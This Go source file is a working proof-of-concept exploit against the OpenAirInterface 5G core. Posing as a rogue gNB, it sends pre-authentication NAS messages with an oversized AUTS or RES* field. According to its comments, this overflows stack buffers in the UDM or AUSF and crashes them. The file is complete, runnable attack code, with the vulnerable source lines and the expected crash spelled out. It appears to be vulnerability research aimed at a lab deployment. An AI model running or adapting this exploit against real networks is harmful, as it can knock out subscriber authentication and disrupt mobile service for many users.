// OAI 5GC stack-overflow PoC (rogue gNB, pre-auth NAS injection).
//
// free5gc-free Go PoC using free5gc ngap/aper/sctp libs as a generic NGAP
// stack. Target: OAI CN5G (develop).
//
//  - CVE-class UDM crash: NAS Authentication Failure (5GMM cause 21,
//    synch failure) carries an oversized AUTS IE. OAI AMF forwards the AUTS
//    unvalidated (amf_n1.cpp) -> AUSF -> UDM handle_resynchronization:
//        uint8_t r_auts[14]; hex_str_to_uint8(r_auts_s.c_str(), r_auts);
//    hex_str_to_uint8 has no destination bounds check -> stack overflow,
//    UDM process dies (SIGSEGV / stack smashing).
//  - AUSF crash mode: NAS Authentication Response carries an oversized
//    RES* (Authentication response parameter IE 0x2d). AUSF
//    handle_confirmation: uint8_t res_star[16]; hex_str_to_uint8(..., res_star)
//    -> stack overflow, AUSF process dies.
//
// Flow: NGSetup -> InitialUEMessage(Registration Request, SUCI null-scheme)
//       -> wait for Authentication Request -> send crafted NAS response.
package main

import (
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"log"
	"net"
	"strings"
	"syscall"
	"time"

	"github.com/free5gc/aper"
	"github.com/free5gc/ngap"
	"github.com/free5gc/ngap/ngapType"
	"github.com/free5gc/sctp"
)

func syscallTimeval(msec int64) syscall.Timeval {
	return syscall.Timeval{Sec: msec / 1000, Usec: (msec % 1000) * 1000}
}

func isEAGAIN(err error) bool {
	return errors.Is(err, syscall.EAGAIN) || errors.Is(err, syscall.EINTR)
}

func encodePLMN(mcc, mnc string) ngapType.PLMNIdentity {
	b := make([]byte, 3)
	b[0] = (mcc[1]-'0')<<4 | (mcc[0] - '0')
	if len(mnc) == 2 {
		b[1] = 0xf0 | (mcc[2] - '0')
		b[2] = (mnc[1]-'0')<<4 | (mnc[0] - '0')
	} else {
		b[1] = (mnc[2]-'0')<<4 | (mcc[2] - '0')
		b[2] = (mnc[1]-'0')<<4 | (mnc[0] - '0')
	}
	return ngapType.PLMNIdentity{Value: aper.OctetString(b)}
}

func encodeTAC(tac uint64) ngapType.TAC {
	tacBytes, _ := hex.DecodeString(fmt.Sprintf("%06x", tac))
	return ngapType.TAC{Value: aper.OctetString(tacBytes)}
}

// plmnBCD encodes MCC/MNC in the NAS/TS 24.008 octet order (used in SUCI).
func plmnBCD(mcc, mnc string) []byte {
	b := make([]byte, 3)
	b[0] = (mcc[1]-'0')<<4 | (mcc[0] - '0')
	if len(mnc) == 2 {
		b[1] = 0xf0 | (mcc[2] - '0')
		b[2] = (mnc[1]-'0')<<4 | (mnc[0] - '0')
	} else {
		b[1] = (mnc[2]-'0')<<4 | (mcc[2] - '0')
		b[2] = (mnc[1]-'0')<<4 | (mnc[0] - '0')
	}
	return b
}

// suciMobileIdentity builds a null-scheme SUCI 5GS mobile identity IE content
// for IMSI = mcc+mnc+msin (10-digit MSIN expected).
func suciMobileIdentity(mcc, mnc, msin string, routing string) []byte {
	if len(msin) != 10 {
		log.Fatalf("[-] msin must be 10 digits, got %q", msin)
	}
	out := []byte{0x01} // type of identity: SUCI
	out = append(out, plmnBCD(mcc, mnc)...)
	ri, _ := hex.DecodeString(routing)
	out = append(out, ri...)
	out = append(out, 0x00) // protection scheme: null
	out = append(out, 0x00) // home network public key id
	for i := 0; i < len(msin); i += 2 {
		lo := msin[i] - '0'
		hi := msin[i+1] - '0'
		out = append(out, lo|(hi<<4))
	}
	return out
}

// buildRegistrationRequest builds a plain-NAS 5GMM Registration Request
// mirroring byte-for-byte the successful ueransim capture:
//   7e 00 41 79 | 00 0d <SUCI 13B> | 2e 04 f0f0f0f0 | 2f 05 04 <sst> <sd>
// Note: OAI decodes the 5GS mobile identity as a Type6 IE with a 2-octet
// length and WITHOUT the spec's 0x77 IEI octet.
func buildRegistrationRequest(mcc, mnc, msin string, sst byte, sd string) []byte {
	nas := []byte{0x7e, 0x00, 0x41} // EPD, plain sec header, Registration Request
	nas = append(nas, 0x79)         // reg type + ngKSI (as sent by ueransim)

	// 5GS mobile identity: 2-octet length + SUCI value (no IEI octet in OAI)
	mid := suciMobileIdentity(mcc, mnc, msin, "0000")
	nas = append(nas, byte(len(mid)>>8), byte(len(mid)))
	nas = append(nas, mid...)

	// UE security capability (IEI 0x2e): EA0-7, IA0-7
	nas = append(nas, 0x2e, 0x04, 0xf0, 0xf0, 0xf0, 0xf0)

	// Requested NSSAI (IEI 0x2f)
	sdB, _ := hex.DecodeString(sd)
	nas = append(nas, 0x2f, 0x05, 0x04, sst, sdB[0], sdB[1], sdB[2])
	return nas
}

// buildAuthFailureAUTS builds a plain-NAS Authentication Failure with
// 5GMM cause 21 (synch failure) and an oversized AUTS IE (IEI 0x30).
func buildAuthFailureAUTS(autsLen int) []byte {
	nas := []byte{0x7e, 0x00, 0x59} // Authentication Failure (TS 24.501 0x59)
	nas = append(nas, 0x15)         // 5GMM cause 21: synch failure
	nas = append(nas, 0x30, byte(autsLen))
	for i := 0; i < autsLen; i++ {
		nas = append(nas, 0x41)
	}
	return nas
}

// buildAuthResponseRES builds a plain-NAS Authentication Response with an
// oversized Authentication response parameter IE (IEI 0x2d) = RES*.
func buildAuthResponseRES(resLen int) []byte {
	nas := []byte{0x7e, 0x00, 0x57} // Authentication Response
	nas = append(nas, 0x2d, byte(resLen))
	for i := 0; i < resLen; i++ {
		nas = append(nas, 0x42)
	}
	return nas
}

func buildNGSetupRequest(mcc, mnc string, tac uint64, gnbId uint32, sst byte, sd string) ([]byte, error) {
	pdu := ngapType.NGAPPDU{}
	pdu.Present = ngapType.NGAPPDUPresentInitiatingMessage
	pdu.InitiatingMessage = new(ngapType.InitiatingMessage)
	im := pdu.InitiatingMessage
	im.ProcedureCode.Value = ngapType.ProcedureCodeNGSetup
	im.Criticality.Value = ngapType.CriticalityPresentReject
	im.Value.Present = ngapType.InitiatingMessagePresentNGSetupRequest
	im.Value.NGSetupRequest = new(ngapType.NGSetupRequest)
	req := im.Value.NGSetupRequest
	{
		ie := ngapType.NGSetupRequestIEs{}
		ie.Id.Value = ngapType.ProtocolIEIDGlobalRANNodeID
		ie.Criticality.Value = ngapType.CriticalityPresentReject
		ie.Value.Present = ngapType.NGSetupRequestIEsPresentGlobalRANNodeID
		ie.Value.GlobalRANNodeID = new(ngapType.GlobalRANNodeID)
		grni := ie.Value.GlobalRANNodeID
		grni.Present = ngapType.GlobalRANNodeIDPresentGlobalGNBID
		grni.GlobalGNBID = new(ngapType.GlobalGNBID)
		grni.GlobalGNBID.PLMNIdentity = encodePLMN(mcc, mnc)
		grni.GlobalGNBID.GNBID.Present = ngapType.GNBIDPresentGNBID
		grni.GlobalGNBID.GNBID.GNBID = new(aper.BitString)
		grni.GlobalGNBID.GNBID.GNBID.Bytes = []byte{byte(gnbId >> 24), byte(gnbId >> 16), byte(gnbId >> 8), byte(gnbId)}
		grni.GlobalGNBID.GNBID.GNBID.BitLength = 32
		req.ProtocolIEs.List = append(req.ProtocolIEs.List, ie)
	}
	{
		ie := ngapType.NGSetupRequestIEs{}
		ie.Id.Value = ngapType.ProtocolIEIDSupportedTAList
		ie.Criticality.Value = ngapType.CriticalityPresentReject
		ie.Value.Present = ngapType.NGSetupRequestIEsPresentSupportedTAList
		ie.Value.SupportedTAList = new(ngapType.SupportedTAList)
		bplmn := ngapType.BroadcastPLMNItem{}
		bplmn.PLMNIdentity = encodePLMN(mcc, mnc)
		ssItem := ngapType.SliceSupportItem{}
		ssItem.SNSSAI.SST.Value = aper.OctetString{sst}
		if sd != "" {
			sdB, _ := hex.DecodeString(sd)
			ssItem.SNSSAI.SD = new(ngapType.SD)
			ssItem.SNSSAI.SD.Value = aper.OctetString(sdB)
		}
		bplmn.TAISliceSupportList.List = append(bplmn.TAISliceSupportList.List, ssItem)
		taItem := ngapType.SupportedTAItem{}
		taItem.TAC = encodeTAC(tac)
		taItem.BroadcastPLMNList.List = append(taItem.BroadcastPLMNList.List, bplmn)
		ie.Value.SupportedTAList.List = append(ie.Value.SupportedTAList.List, taItem)
		req.ProtocolIEs.List = append(req.ProtocolIEs.List, ie)
	}
	{
		ie := ngapType.NGSetupRequestIEs{}
		ie.Id.Value = ngapType.ProtocolIEIDDefaultPagingDRX
		ie.Criticality.Value = ngapType.CriticalityPresentIgnore
		ie.Value.Present = ngapType.NGSetupRequestIEsPresentDefaultPagingDRX
		ie.Value.DefaultPagingDRX = new(ngapType.PagingDRX)
		ie.Value.DefaultPagingDRX.Value = ngapType.PagingDRXPresentV32
		req.ProtocolIEs.List = append(req.ProtocolIEs.List, ie)
	}
	return ngap.Encoder(pdu)
}

func buildInitialUEMessage(mcc, mnc string, tac uint64, ranUeNgapID int64, nasPdu []byte) ([]byte, error) {
	pdu := ngapType.NGAPPDU{}
	pdu.Present = ngapType.NGAPPDUPresentInitiatingMessage
	pdu.InitiatingMessage = new(ngapType.InitiatingMessage)
	im := pdu.InitiatingMessage
	im.ProcedureCode.Value = ngapType.ProcedureCodeInitialUEMessage
	im.Criticality.Value = ngapType.CriticalityPresentIgnore
	im.Value.Present = ngapType.InitiatingMessagePresentInitialUEMessage
	im.Value.InitialUEMessage = new(ngapType.InitialUEMessage)
	req := im.Value.InitialUEMessage
	{
		ie := ngapType.InitialUEMessageIEs{}
		ie.Id.Value = ngapType.ProtocolIEIDRANUENGAPID
		ie.Criticality.Value = ngapType.CriticalityPresentReject
		ie.Value.Present = ngapType.InitialUEMessageIEsPresentRANUENGAPID
		ie.Value.RANUENGAPID = new(ngapType.RANUENGAPID)
		ie.Value.RANUENGAPID.Value = ranUeNgapID
		req.ProtocolIEs.List = append(req.ProtocolIEs.List, ie)
	}
	{
		ie := ngapType.InitialUEMessageIEs{}
		ie.Id.Value = ngapType.ProtocolIEIDNASPDU
		ie.Criticality.Value = ngapType.CriticalityPresentReject
		ie.Value.Present = ngapType.InitialUEMessageIEsPresentNASPDU
		ie.Value.NASPDU = new(ngapType.NASPDU)
		ie.Value.NASPDU.Value = nasPdu
		req.ProtocolIEs.List = append(req.ProtocolIEs.List, ie)
	}
	{
		ie := ngapType.InitialUEMessageIEs{}
		ie.Id.Value = ngapType.ProtocolIEIDUserLocationInformation
		ie.Criticality.Value = ngapType.CriticalityPresentReject
		ie.Value.Present = ngapType.InitialUEMessageIEsPresentUserLocationInformation
		ie.Value.UserLocationInformation = new(ngapType.UserLocationInformation)
		uli := ie.Value.UserLocationInformation
		uli.Present = ngapType.UserLocationInformationPresentUserLocationInformationNR
		uli.UserLocationInformationNR = new(ngapType.UserLocationInformationNR)
		uli.UserLocationInformationNR.NRCGI.PLMNIdentity = encodePLMN(mcc, mnc)
		uli.UserLocationInformationNR.NRCGI.NRCellIdentity.Value = aper.BitString{
			Bytes: []byte{0x00, 0x00, 0x00, 0x01, 0x00}, BitLength: 36}
		uli.UserLocationInformationNR.TAI.PLMNIdentity = encodePLMN(mcc, mnc)
		uli.UserLocationInformationNR.TAI.TAC = encodeTAC(tac)
		req.ProtocolIEs.List = append(req.ProtocolIEs.List, ie)
	}
	{
		ie := ngapType.InitialUEMessageIEs{}
		ie.Id.Value = ngapType.ProtocolIEIDRRCEstablishmentCause
		ie.Criticality.Value = ngapType.CriticalityPresentIgnore
		ie.Value.Present = ngapType.InitialUEMessageIEsPresentRRCEstablishmentCause
		ie.Value.RRCEstablishmentCause = new(ngapType.RRCEstablishmentCause)
		ie.Value.RRCEstablishmentCause.Value = ngapType.RRCEstablishmentCausePresentMoSignalling
		req.ProtocolIEs.List = append(req.ProtocolIEs.List, ie)
	}
	return ngap.Encoder(pdu)
}

func buildUplinkNASTransport(amfUeNgapID, ranUeNgapID int64, nasPdu []byte) ([]byte, error) {
	pdu := ngapType.NGAPPDU{}
	pdu.Present = ngapType.NGAPPDUPresentInitiatingMessage
	pdu.InitiatingMessage = new(ngapType.InitiatingMessage)
	im := pdu.InitiatingMessage
	im.ProcedureCode.Value = ngapType.ProcedureCodeUplinkNASTransport
	im.Criticality.Value = ngapType.CriticalityPresentIgnore
	im.Value.Present = ngapType.InitiatingMessagePresentUplinkNASTransport
	im.Value.UplinkNASTransport = new(ngapType.UplinkNASTransport)
	req := im.Value.UplinkNASTransport
	{
		ie := ngapType.UplinkNASTransportIEs{}
		ie.Id.Value = ngapType.ProtocolIEIDAMFUENGAPID
		ie.Criticality.Value = ngapType.CriticalityPresentReject
		ie.Value.Present = ngapType.UplinkNASTransportIEsPresentAMFUENGAPID
		ie.Value.AMFUENGAPID = new(ngapType.AMFUENGAPID)
		ie.Value.AMFUENGAPID.Value = amfUeNgapID
		req.ProtocolIEs.List = append(req.ProtocolIEs.List, ie)
	}
	{
		ie := ngapType.UplinkNASTransportIEs{}
		ie.Id.Value = ngapType.ProtocolIEIDRANUENGAPID
		ie.Criticality.Value = ngapType.CriticalityPresentReject
		ie.Value.Present = ngapType.UplinkNASTransportIEsPresentRANUENGAPID
		ie.Value.RANUENGAPID = new(ngapType.RANUENGAPID)
		ie.Value.RANUENGAPID.Value = ranUeNgapID
		req.ProtocolIEs.List = append(req.ProtocolIEs.List, ie)
	}
	{
		ie := ngapType.UplinkNASTransportIEs{}
		ie.Id.Value = ngapType.ProtocolIEIDNASPDU
		ie.Criticality.Value = ngapType.CriticalityPresentReject
		ie.Value.Present = ngapType.UplinkNASTransportIEsPresentNASPDU
		ie.Value.NASPDU = new(ngapType.NASPDU)
		ie.Value.NASPDU.Value = nasPdu
		req.ProtocolIEs.List = append(req.ProtocolIEs.List, ie)
	}
	return ngap.Encoder(pdu)
}

func dial(host string, port int) (*sctp.SCTPConn, error) {
	raddr, err := net.ResolveIPAddr("ip", host)
	if err != nil {
		return nil, err
	}
	cfg := sctp.SocketConfig{
		InitMsg: sctp.InitMsg{NumOstreams: 5, MaxInstreams: 5, MaxAttempts: 4, MaxInitTimeout: 8},
	}
	conn, err := cfg.Dial("sctp", nil, &sctp.SCTPAddr{IPAddrs: []net.IPAddr{*raddr}, Port: port})
	if err != nil {
		return nil, err
	}
	info, err := conn.GetDefaultSentParam()
	if err != nil {
		conn.Close()
		return nil, err
	}
	info.PPID = ngap.PPID
	if err := conn.SetDefaultSentParam(info); err != nil {
		conn.Close()
		return nil, err
	}
	return conn, nil
}

func readMsg(conn *sctp.SCTPConn, timeout time.Duration) ([]byte, error) {
	deadline := time.Now().Add(timeout)
	buf := make([]byte, 65536)
	for time.Now().Before(deadline) {
		if err := conn.SetReadTimeout(syscallTimeval(1000)); err != nil {
			return nil, err
		}
		n, info, _, err := conn.SCTPRead(buf)
		if err != nil {
			if isEAGAIN(err) {
				continue
			}
			return nil, err
		}
		if n == 0 {
			continue
		}
		if info != nil && info.PPID != ngap.PPID {
			continue
		}
		out := make([]byte, n)
		copy(out, buf[:n])
		return out, nil
	}
	return nil, fmt.Errorf("timeout")
}

// nasTypeOf returns the 5GMM message type of a (possibly security-protected) NAS PDU.
func nasTypeOf(b []byte) (byte, bool) {
	if len(b) < 7 || b[0] != 0x7e {
		return 0, false
	}
	sh := b[1] & 0x0f
	if sh == 0 {
		if len(b) < 3 {
			return 0, false
		}
		return b[2], true
	}
	// protected: inner message after 7-byte header
	if len(b) < 8 {
		return 0, false
	}
	inner := b[7:]
	if len(inner) >= 3 && inner[0] == 0x7e {
		return inner[2], true
	}
	return 0, false
}

func main() {
	host := flag.String("host", "172.30.0.7", "AMF NGAP IP")
	port := flag.Int("port", 38412, "AMF NGAP SCTP port")
	mode := flag.String("mode", "auts", "auts (UDM overflow via Auth Failure) | res (AUSF overflow via Auth Response)")
	mcc := flag.String("mcc", "208", "PLMN MCC")
	mnc := flag.String("mnc", "95", "PLMN MNC")
	msin := flag.String("msin", "0000000031", "10-digit MSIN of a provisioned subscriber")
	tac := flag.Uint64("tac", 0xa000, "TAC matching AMF plmn_support_list")
	sst := flag.Uint("sst", 222, "S-NSSAI SST")
	sd := flag.String("sd", "00007b", "S-NSSAI SD (hex)")
	gnbId := flag.Uint("gnbid", 0x0adead, "rogue gNB ID")
	size := flag.Int("size", 200, "oversized AUTS/RES* length (bytes)")
	flag.Parse()

	// sanity: NAS PDU must fit in the message length octet
	if *size > 253 {
		log.Fatalf("[-] size must be <= 253")
	}

	conn, err := dial(*host, *port)
	if err != nil {
		log.Fatalf("[-] SCTP dial: %v", err)
	}
	defer conn.Close()
	log.Printf("[+] SCTP association to %s:%d", *host, *port)

	// 1. NGSetup
	ngsetup, err := buildNGSetupRequest(*mcc, *mnc, *tac, uint32(*gnbId), byte(*sst), *sd)
	if err != nil {
		log.Fatalf("[-] build NGSetup: %v", err)
	}
	if _, err := conn.SCTPWrite(ngsetup, nil); err != nil {
		log.Fatalf("[-] send NGSetup: %v", err)
	}
	resp, err := readMsg(conn, 5*time.Second)
	if err != nil {
		log.Fatalf("[-] no NGSetupResponse: %v", err)
	}
	rpdu, derr := ngap.Decoder(resp)
	if derr != nil || rpdu == nil || rpdu.Present != ngapType.NGAPPDUPresentSuccessfulOutcome {
		log.Fatalf("[-] NGSetup rejected (PLMN/TAC/NSSAI mismatch?): %s", hex.EncodeToString(resp))
	}
	log.Printf("[+] NGSetup accepted (rogue gNB %08x, no authentication)", *gnbId)

	// 2. InitialUEMessage with Registration Request (SUCI, null scheme)
	regReq := buildRegistrationRequest(*mcc, *mnc, *msin, byte(*sst), *sd)
	iue, err := buildInitialUEMessage(*mcc, *mnc, *tac, 1, regReq)
	if err != nil {
		log.Fatalf("[-] build InitialUEMessage: %v", err)
	}
	if _, err := conn.SCTPWrite(iue, nil); err != nil {
		log.Fatalf("[-] send InitialUEMessage: %v", err)
	}
	log.Printf("[+] InitialUEMessage sent: Registration Request SUCI %s%s%s (null scheme)",
		*mcc, *mnc, *msin)

	// 3. Wait for Authentication Request
	var amfUeNgapID int64 = -1
	deadline := time.Now().Add(15 * time.Second)
	for time.Now().Before(deadline) {
		raw, rerr := readMsg(conn, 2*time.Second)
		if rerr != nil {
			break
		}
		pdu, derr := ngap.Decoder(raw)
		if derr != nil || pdu == nil || pdu.Present != ngapType.NGAPPDUPresentInitiatingMessage {
			continue
		}
		if pdu.InitiatingMessage.ProcedureCode.Value != ngapType.ProcedureCodeDownlinkNASTransport ||
			pdu.InitiatingMessage.Value.DownlinkNASTransport == nil {
			continue
		}
		dl := pdu.InitiatingMessage.Value.DownlinkNASTransport
		var nasPdu []byte
		for _, ie := range dl.ProtocolIEs.List {
			switch ie.Id.Value {
			case ngapType.ProtocolIEIDAMFUENGAPID:
				if ie.Value.AMFUENGAPID != nil {
					amfUeNgapID = ie.Value.AMFUENGAPID.Value
				}
			case ngapType.ProtocolIEIDNASPDU:
				if ie.Value.NASPDU != nil {
					nasPdu = ie.Value.NASPDU.Value
				}
			}
		}
		mt, ok := nasTypeOf(nasPdu)
		if ok && mt == 0x56 {
			log.Printf("[+] Authentication Request received (AMF-UE-NGAP-ID=%d)", amfUeNgapID)
			break
		}
		log.Printf("[*] downlink NAS type 0x%02x (ok=%v), waiting for Authentication Request...", mt, ok)
	}
	if amfUeNgapID < 0 {
		log.Fatalf("[-] never received Authentication Request - subscriber known? (check UDM/UDR)")
	}

	// 4. Crafted NAS response
	var nasResp []byte
	if *mode == "auts" {
		nasResp = buildAuthFailureAUTS(*size)
		log.Printf("[+] Sending Authentication Failure: cause=21 (synch fail), AUTS len=%d (spec max 14)", *size)
	} else {
		nasResp = buildAuthResponseRES(*size)
		log.Printf("[+] Sending Authentication Response: RES* len=%d (spec max 16)", *size)
	}
	ul, err := buildUplinkNASTransport(amfUeNgapID, 1, nasResp)
	if err != nil {
		log.Fatalf("[-] build UplinkNASTransport: %v", err)
	}
	if _, err := conn.SCTPWrite(ul, nil); err != nil {
		log.Fatalf("[-] send UplinkNASTransport: %v", err)
	}
	log.Printf("[+] Oversized NAS payload delivered. AMF forwards to AUSF/UDM over SBI.")
	if *mode == "auts" {
		log.Printf("[+] Expected: oai-udm dies (stack overflow in handle_resynchronization: uint8_t r_auts[14])")
	} else {
		log.Printf("[+] Expected: oai-ausf dies (stack overflow in handle_confirmation: uint8_t res_star[16])")
	}
	log.Printf("[+] Verify: docker inspect oai-udm|oai-ausf --format '{{.State.Status}}'  +  docker logs")
	time.Sleep(3 * time.Second)
	_ = strings.ToUpper
}
